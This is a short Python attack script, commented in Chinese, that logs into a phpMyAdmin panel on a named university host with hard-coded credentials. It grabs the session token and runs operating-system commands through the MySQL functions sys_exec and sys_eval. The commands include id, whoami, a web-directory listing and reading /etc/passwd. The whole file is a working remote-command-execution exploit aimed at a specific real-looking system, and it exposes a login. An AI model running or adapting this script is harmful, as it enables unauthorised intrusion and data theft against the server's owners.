#!/usr/bin/env python3
import requests
import re
import urllib3
import html
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 使用sys_exec执行命令并获取输出
print("[*] 使用sys_exec执行命令...")

# 执行id命令
sql = "SELECT sys_exec('id');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

# 解析响应
content = resp.text
# 查找所有td标签
tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
results = []
for td in tds:
    clean = re.sub(r'<[^>]+>', '', td).strip()
    clean = html.unescape(clean)
    if clean and len(clean) > 0:
        results.append(clean)

print(f"[*] 响应结果: {results}")

# 尝试sys_eval（返回输出）
sql = "SELECT sys_eval('id');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

content = resp.text
tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
for td in tds:
    clean = re.sub(r'<[^>]+>', '', td).strip()
    clean = html.unescape(clean)
    if "uid=" in clean or "gid=" in clean:
        print(f"[+] sys_eval命令执行成功!")
        print(f"输出: {clean}")
        
        # 执行更多命令
        commands = [
            "whoami",
            "pwd",
            "ls -la /var/www/html/enmeeting/",
            "cat /etc/passwd",
        ]
        
        for cmd in commands:
            sql = f"SELECT sys_eval('{cmd}');"
            sql_data = {"sql_query": sql, "db": "mysql"}
            resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
            content = resp.text
            tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
            for td in tds:
                clean = re.sub(r'<[^>]+>', '', td).strip()
                clean = html.unescape(clean)
                if clean and len(clean) > 3:
                    print(f"[+] {cmd} 输出: {clean[:200]}")
        break
